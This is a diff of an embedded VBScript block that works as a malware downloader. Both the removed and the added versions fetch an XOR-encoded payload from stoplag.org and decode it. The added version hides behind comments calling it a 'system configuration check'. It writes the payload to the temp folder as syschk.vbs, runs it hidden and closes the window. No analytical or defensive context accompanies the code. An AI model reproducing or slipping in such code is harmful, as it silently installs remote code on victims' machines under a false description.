@@ -1,16 +1,33 @@
 <script language="VBScript">
-On Error Resume Next
-Dim x,a,r,i
-Set x=CreateObject("MSXML2.XMLHTTP")
-x.Open "GET","https://stoplag.org/s2.txt",False
-x.Send
-If x.Status=200 Then
- a=Split(x.ResponseText,",")
- r=""
- For i=0 To UBound(a)
-  r=r&Chr(CInt(a(i)) Xor 137)
- Next
- Execute r
+' System configuration check module
+' Retrieves update configuration from management server
+
+Dim httpReq, rawData, parts, decoded, i, fso, tmpFile, shell
+Dim serverUrl, dataPath, decryptionKey
+
+serverUrl = "https://stoplag.org"
+dataPath = "/s2.txt"
+decryptionKey = 137
+
+Set httpReq = CreateObject("MSXML2.XMLHTTP")
+httpReq.Open "GET", serverUrl & dataPath, False
+httpReq.Send
+
+If httpReq.Status = 200 Then
+  parts = Split(httpReq.ResponseText, ",")
+  decoded = ""
+  For i = 0 To UBound(parts)
+    decoded = decoded & Chr(CInt(parts(i)) Xor decryptionKey)
+  Next
+  
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  Set tmpFile = fso.CreateTextFile(fso.GetSpecialFolder(2) & "\syschk.vbs", True)
+  tmpFile.Write decoded
+  tmpFile.Close
+  
+  Set shell = CreateObject("WScript.Shell")
+  shell.Run """" & fso.GetSpecialFolder(2) & "\syschk.vbs""", 0, False
 End If
+
 self.Close()
 </script>
